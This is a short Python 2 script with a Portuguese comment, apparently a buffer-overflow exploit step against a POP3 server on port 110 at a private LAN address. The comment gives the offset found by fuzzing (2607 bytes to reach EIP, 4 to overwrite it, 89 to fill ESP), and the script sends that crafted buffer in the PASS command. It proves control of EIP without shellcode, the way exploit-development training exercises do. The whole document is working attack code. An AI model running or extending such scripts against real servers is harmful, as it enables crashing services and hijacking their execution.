#!/usr/bin/python

import socket

#O fuzzing revelou que a aplicacao tinha crash com 2700 bytes, nos testes foi descoberto que precisam 2607 bytes para chegar a EIP e 4 bytes para sobrescrever seu conteudo. Entao enviaremos 2607 letras A para chegar em EIP, 4 letras B para sobrescrever o EIP e a diferenca entre a soma de A e B (2607 + 4) que seriam 89 bytes de letras C para preencher o ESP
bytes = 'A' * 2607 + 'B' * 4 + 'C' * 89

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.connect(('192.168.0.104',110))
	r = s.recv(1024)
	print r

	s.send('USER teste\r\n')
	r = s.recv(1024)
	print r

	s.send('PASS' + bytes + '\r\n')
	r = s.recv(1024)
	print r


	s.send('QUIT\r\n')
	r = s.recv(1024)
	print r

except:
	print "Erro ao conectar"		
